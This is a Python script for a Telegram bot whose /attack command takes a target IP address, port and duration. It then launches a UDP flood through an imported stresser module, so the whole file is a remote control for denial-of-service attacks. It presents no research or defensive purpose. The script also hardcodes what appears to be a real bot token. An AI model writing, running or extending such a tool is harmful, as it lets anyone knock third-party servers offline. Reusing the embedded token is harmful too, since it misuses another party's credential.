from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import threading
from udp_stresser import udp_flood

# Replace with your bot token
TELEGRAM_BOT_TOKEN = "7234637498:AAHRaG2Iv0t45c9SY4Ko2NoWoWOQ3hHb27k"

# Function to handle the /attack command
def attack(update: Update, context: CallbackContext):
    try:
        # Parse the command: /attack <ip> <port> <duration>
        args = context.args
        if len(args) != 3:
            update.message.reply_text("Usage: /attack <ip> <port> <duration>")
            return

        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])

        # Start the UDP flood in a separate thread
        threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)).start()
        update.message.reply_text(f"Attack started on {target_ip}:{target_port} for {duration} seconds.")
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

# Main function to start the bot
def main():
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dispatcher = updater.dispatcher

    # Add the /attack command handler
    dispatcher.add_handler(CommandHandler("attack", attack))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
